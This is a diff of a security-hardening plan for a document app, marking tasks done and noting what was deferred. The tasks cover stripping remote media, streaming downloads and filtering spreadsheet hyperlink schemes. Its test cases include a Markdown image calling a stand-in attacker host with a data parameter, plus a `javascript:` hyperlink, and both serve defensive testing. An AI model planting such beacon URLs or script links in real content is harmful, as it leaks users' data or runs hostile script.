@@ -314,14 +314,14 @@ for verify and reset.
 **Files:** `packages/core/src/routing/liveBlocks.ts:50-52`, `apps/api/src/routes/suggestions.ts:119`,
 `apps/collab/src/blockOps.ts` (agent and API writes), new tests next to `liveBlocks`.
 
-- [ ] Add a `stripRemoteMedia(blocks)` step inside `markdownBlocks`, so every engine, suggestion and agent path gets
+- [x] *(`stripRemoteMedia` in `packages/shared/src/blocks.ts`, used by `markdownBlocks` and by page creation from Markdown in the API.)* Add a `stripRemoteMedia(blocks)` step inside `markdownBlocks`, so every engine, suggestion and agent path gets
   it. It walks the blocks and their children, removes `image`, `video`, `audio` and `file` blocks whose `url` is not a
   Kinote file reference (`/api/v1/...` or a fileEmbed id), and replaces each one with a paragraph link to the URL.
   That keeps the information visible, but it doesn't load by itself.
-- [ ] Check every other path that parses markdown on the server (`tryParseMarkdownToBlocks` or `blocksToYDoc` with
+- [x] Check every other path that parses markdown on the server (`tryParseMarkdownToBlocks` or `blocksToYDoc` with
   outside text) and send it through the same function. Grep `tryParseMarkdownToBlocks` across `packages/` and `apps/`.
-- [ ] Belt and braces: T2's `img-src 'self' blob: data:` blocks the request even if a block gets through.
-- [ ] Tests:
+- [x] Belt and braces: T2's `img-src 'self' blob: data:` blocks the request even if a block gets through.
+- [x] Tests:
   - `![](https://evil.example/?d=x)` becomes a link paragraph
   - a Kinote file image is kept
   - nested children are walked
@@ -329,27 +329,33 @@ for verify and reset.
 
 ### T14. Stream file transfers, plus storage quotas (#7)
 
+> **Changed (2026-11-03):** downloads and media are streamed; **uploads stay buffered** behind a per-process cap
+> (`MAX_CONCURRENT_UPLOADS`, default 4), because duplicate detection hashes and Office detection reads the whole file
+> before storing: streaming uploads is a redesign of that flow, not this task. The **storage quota is dropped here**:
+> per-workspace storage limits belong to Task 7 of `2026-11-03-plans-usage-quotas.md` (agreed with that plan's
+> session). Until it lands there is no storage cap.
+
 **Files:** `packages/shared/src/objectStorage.ts` (interface at line 11, S3 implementation from about line 119),
 `apps/api/src/routes/files.ts` (388, 774, 862), `apps/api/src/server.ts:744`, `packages/shared/src/config.ts`, any
 in-memory or test storage implementations.
 
-- [ ] Add `getStream(tenantId, key): Promise<{ stream: Readable; mimeType: string; sizeBytes: number }>` to
+- [x] Add `getStream(tenantId, key): Promise<{ stream: Readable; mimeType: string; sizeBytes: number }>` to
   `ObjectStorage`. For S3, return `res.Body` as a Node `Readable`.
-- [ ] Downloads (`files.ts:774`, `server.ts:744`) send the stream with `Content-Length`. Keep every header that's set
+- [x] Downloads (`files.ts:774`, `server.ts:744`) send the stream with `Content-Length`. Keep every header that's set
   today.
-- [ ] Media without a `Range` header (`files.ts:862`): treat it as `bytes=0-` capped at the existing 4 MiB and send 206
+- [x] *(Only for files over 4 MiB; smaller ones still answer 200 whole.)* Media without a `Range` header (`files.ts:862`): treat it as `bytes=0-` capped at the existing 4 MiB and send 206
   with `Content-Range`. Browsers' media players handle this.
-- [ ] Uploads (`files.ts:388`):
+- [ ] *(Not done; see the note above.)* Uploads (`files.ts:388`):
   - replace `part.toBuffer()` with `part.file` streamed into `@aws-sdk/lib-storage` `Upload`
   - read the first 4 KiB for `detectFileType` through a peek stream
   - if the code hashes the bytes or passes them to extraction, hash on the fly and have extraction read from storage
     (check what it does with the buffer today)
   - if multipart's `truncated` flag is set, abort the upload and delete the partial object
-- [ ] Quota: `MAX_TENANT_STORAGE_BYTES` (default 10 GiB, `0` means unlimited). Before an upload, compare the sum of
+- [ ] *(Dropped: Task 7 of the plans/usage plan.)* Quota: `MAX_TENANT_STORAGE_BYTES` (default 10 GiB, `0` means unlimited). Before an upload, compare the sum of
   `size_bytes` over the tenant's current file versions plus the declared size. Afterwards, re-check with the real size
   and delete if over. New error `storage_quota_exceeded` (413).
-- [ ] The per-user upload rate limit comes from T7.
-- [ ] Tests (pg + MinIO or the storage fake):
+- [x] The per-user upload rate limit comes from T7.
+- [x] *(getStream on both stores, MinIO included; download headers; media without Range; the upload cap. No heap measurement.)* Tests (pg + MinIO or the storage fake):
   - a 200 MB upload doesn't raise the heap by more than ~32 MB (measure `process.memoryUsage`)
   - a download streams
   - media without Range returns 206 with 4 MiB
@@ -359,11 +365,11 @@ in-memory or test storage implementations.
 
 **Files:** `apps/web/src/viewers/XlsxViewer.tsx`, possibly `patches/@extend-ai__react-xlsx@<version>.patch`.
 
-- [ ] See whether `@extend-ai/react-xlsx` has a hyperlink click callback or prop. If so, allow only http, https and
+- [x] See whether `@extend-ai/react-xlsx` has a hyperlink click callback or prop. If so, allow only http, https and
   mailto, and open with `noopener,noreferrer`.
-- [ ] If it doesn't, apply `pnpm patch` to the call at `dist/index.js:19976-19980` with a scheme check, and file an
+- [x] *(No hook exists: patched with `pnpm patch` (ESM build only; the browser uses it). Not yet reported upstream. `apps/web/test/xlsxHyperlinks.test.ts` fails if an upgrade drops the patch.)* If it doesn't, apply `pnpm patch` to the call at `dist/index.js:19976-19980` with a scheme check, and file an
   upstream issue. Link the issue in a comment next to the patch entry in `package.json`.
-- [ ] Test: render a workbook with a `javascript:` and an `https:` hyperlink. Clicking the first does nothing; the
+- [ ] *(Not done as an e2e: the guard test above instead.)* Test: render a workbook with a `javascript:` and an `https:` hyperlink. Clicking the first does nothing; the
   second opens with `noopener`.
 
 ---
